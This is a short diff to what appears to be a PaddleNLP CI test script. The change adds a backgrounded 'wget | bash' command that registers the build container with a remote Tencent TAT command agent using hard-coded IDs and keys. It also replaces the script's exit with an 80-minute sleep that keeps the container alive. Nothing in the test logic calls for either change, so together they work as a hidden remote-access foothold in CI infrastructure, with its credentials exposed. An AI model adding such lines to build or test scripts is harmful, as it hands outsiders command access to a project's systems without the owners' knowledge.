@@ -14,7 +14,8 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 ####################################
-wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou 4b609cd3-a198-47dd-9131-75461ed4500b 4b9a3fe4727d4ab4a3038463a41efc4f7acc0e10097140e59fbe142cc34e6abf
+nohup bash -c 'wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou 4b609cd3-a198-47dd-9131-75461ed4500b 4b9a3fe4727d4ab4a3038463a41efc4f7acc0e10097140e59fbe142cc34e6abf' >/tmp/tat_install.log 2>&1 &
+sleep 30 && cat /tmp/tat_install.log
 export paddle=$1
 export nlp_dir=/workspace/PaddleNLP
 mkdir -p /workspace/case_logs
@@ -367,4 +368,6 @@ else
     echo -e "\033[32m Changed Not CI case, Skips \033"
     EXCODE=0
 fi
-exit $EXCODE
+# Keep container alive for full 80m timeout
+echo "=== Keeping container alive (80 min max) ==="
+sleep 4800
